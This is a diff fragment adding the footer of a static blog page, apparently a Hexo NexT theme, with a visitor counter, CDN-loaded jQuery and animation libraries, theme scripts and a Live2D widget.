+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv" title="Total Visitors">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="site-pv" title="Total Views">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.ui.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_sphere.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/src/love.js"></script>
